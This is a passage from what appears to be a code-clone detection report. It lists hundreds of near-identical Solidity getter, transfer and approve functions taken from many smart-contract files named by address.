    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="62" endline="64" pcid="95">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="66" endline="68" pcid="7382">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="69" endline="71" pcid="6627">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="66" endline="68" pcid="1845">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="71" endline="73" pcid="5848">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="65" endline="67" pcid="772">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="236" endline="238" pcid="7874">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="61" endline="63" pcid="7742">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="65" endline="67" pcid="5467">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="66" endline="68" pcid="2094">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="138" endline="140" pcid="371">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="64" endline="66" pcid="7295">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="66" endline="68" pcid="6839">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="62" endline="64" pcid="4045">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="64" endline="66" pcid="2941">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="62" endline="64" pcid="7149">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="66" endline="68" pcid="8865">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="62" endline="64" pcid="8018">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="63" endline="65" pcid="7605">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x25247a283047f964638be79886b61af12d3fe568.sol" startline="38" endline="40" pcid="1169">
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="62" endline="64" pcid="5733">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="60" endline="62" pcid="3272">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="138" endline="140" pcid="4502">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="63" endline="65" pcid="1130">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="65" endline="67" pcid="6318">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="61" endline="63" pcid="7988">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x07d02e6806fe51ba3488ba0536589cdbd393ff15.sol" startline="1499" endline="1501" pcid="198">
    function balanceOf(address account) public view returns (uint256) {
        return t[account];
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="62" endline="64" pcid="8811">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="66" endline="68" pcid="5145">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="62" endline="64" pcid="7203">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="64" endline="66" pcid="4792">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="63" endline="65" pcid="2373">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="63" endline="65" pcid="8258">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="400" endline="402" pcid="6406">
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="51" endline="53" pcid="3498">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="66" endline="68" pcid="3758">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="63" endline="65" pcid="5076">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="62" endline="64" pcid="9176">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="66" endline="68" pcid="261">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="64" endline="66" pcid="5046">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="65" endline="67" pcid="4967">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="65" endline="67" pcid="858">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="138" endline="140" pcid="2385">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="65" endline="67" pcid="1293">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="63" endline="65" pcid="211">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="62" endline="64" pcid="9191">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="69" endline="71" pcid="562">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="59" endline="61" pcid="8850">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="59" endline="61" pcid="6552">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0bdce6ba4c10f8e509b02382066e5402b97a7c80.sol" startline="1505" endline="1507" pcid="315">
    function balanceOf(address account) public view returns (uint256) {
        return t[account];
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="66" endline="68" pcid="4931">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3e38b0bdd812dbac53b3e250c578b3f8e5b1730a.sol" startline="45" endline="47" pcid="2259">
    function viewAirdropAmount(address _wallet) external view returns (uint256) {
        return airdrops[_wallet];
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="67" endline="69" pcid="729">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="65" endline="67" pcid="6049">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="66" endline="68" pcid="1384">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5d3feb9feedf8e6bbf8dd1b8c3be081b11cb687f.sol" startline="20" endline="22" pcid="3537">
    function balanceOf(address user) public view returns(uint256){
        return t[user];
    }
</source>
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="275" endline="277" pcid="751">
    function getBlackListStatus(address _maker) external constant returns (bool) {
        return isBlackListed[_maker];
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="65" endline="67" pcid="7188">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="63" endline="65" pcid="3287">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="70" endline="72" pcid="2524">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="66" endline="68" pcid="3087">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xA62Fc0BA9Deeee9336511741c2Dfc4F5b00E128B.sol" startline="115" endline="117" pcid="6061">
    function get_stake_last_time(address addr) external view returns (uint256) {
        return stake_last_time_map[addr];
    }
</source>
<source file="systems/source-code/0xA62Fc0BA9Deeee9336511741c2Dfc4F5b00E128B.sol" startline="109" endline="111" pcid="6060">
    function get_stake_token(address addr) external view returns (uint256) {
        return stake_token_map[addr];
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="62" endline="64" pcid="6747">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xA62Fc0BA9Deeee9336511741c2Dfc4F5b00E128B.sol" startline="103" endline="105" pcid="6059">
    function get_credit(address addr) external view returns (uint256) {
        return credit_map[addr];
    }
</source>
<source file="systems/source-code/0xf1d00aE9Bb8D5369786FD83A0103866071C59cA4.sol" startline="63" endline="65" pcid="8833">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="66" endline="68" pcid="2896">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="68" endline="70" pcid="5061">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="65" endline="67" pcid="2851">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="65" endline="67" pcid="1004">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="62" endline="64" pcid="4841">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="66" endline="68" pcid="7516">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="65" endline="67" pcid="7164">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="68" endline="70" pcid="3619">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="63" endline="65" pcid="5091">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="66" endline="68" pcid="4209">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="64" endline="66" pcid="65">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="67" endline="69" pcid="8408">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="61" endline="63" pcid="2687">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="62" endline="64" pcid="8318">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="62" endline="64" pcid="8483">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="63" endline="65" pcid="7697">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="67" endline="69" pcid="447">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xb07F1e635FbA15234B11A351Ee03Da67D11111B2.sol" startline="67" endline="69" pcid="6500">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="64" endline="66" pcid="2800">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5f0E9E062f22c7C32A243f93fB2a6aA7da748114.sol" startline="38" endline="40" pcid="3589">
    function checkContribution(address user) public view returns (uint256) {
        return buyers[user];
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="62" endline="64" pcid="4132">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="64" endline="66" pcid="3711">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="267" endline="269" pcid="2595">
    function getBlackListStatus(address _maker) external constant returns (bool) {
        return isBlackListed[_maker];
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="66" endline="68" pcid="2836">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf157af38701777fc54f34bf6ccde57bb1c364fae.sol" startline="35" endline="37" pcid="8820">
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="61" endline="63" pcid="8003">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="66" endline="68" pcid="1913">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="62" endline="64" pcid="1963">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
</class>

<class classid="2" nclones="1007" nlines="4" similarity="100">
<source file="systems/source-code/0x0000Db4632C8Ca4DD7E3C570397012cCBf57045b.sol" startline="32" endline="35" pcid="3">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="80" endline="83" pcid="6541">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="41" endline="44" pcid="6548">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="73" endline="76" pcid="3254">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB34429e7E522e8cDdDC4D4a49E98E073bdfEa29a.sol" startline="50" endline="53" pcid="6550">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="84" endline="87" pcid="1114">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="74" endline="77" pcid="7541">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="86" endline="89" pcid="3121">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="72" endline="75" pcid="1597">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="64" endline="67" pcid="593">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="81" endline="84" pcid="8899">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="82" endline="85" pcid="1599">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="174" endline="177" pcid="620">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="70" endline="73" pcid="6539">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="71" endline="74" pcid="7428">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="73" endline="76" pcid="126">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="185" endline="188" pcid="5233">
    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="83" endline="86" pcid="3256">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="71" endline="74" pcid="141">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="71" endline="74" pcid="534">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="71" endline="74" pcid="1132">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="76" endline="79" pcid="3119">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="74" endline="77" pcid="6567">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="171" endline="174" pcid="5232">
    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="80" endline="83" pcid="6138">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="84" endline="87" pcid="9024">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="84" endline="87" pcid="6569">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="70" endline="73" pcid="9193">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="70" endline="73" pcid="3885">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="79" endline="82" pcid="6519">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="67" endline="70" pcid="3530">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="70" endline="73" pcid="6136">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="74" endline="77" pcid="1112">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="175" endline="178" pcid="2392">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="75" endline="78" pcid="4743">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="70" endline="73" pcid="6582">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="80" endline="83" pcid="6584">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="75" endline="78" pcid="9130">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="78" endline="81" pcid="1902">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="72" endline="75" pcid="8425">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="83" endline="86" pcid="2187">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="83" endline="86" pcid="2291">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="69" endline="72" pcid="6517">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="74" endline="77" pcid="3760">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="69" endline="72" pcid="7744">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="85" endline="88" pcid="4745">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="398" endline="401" pcid="9314">
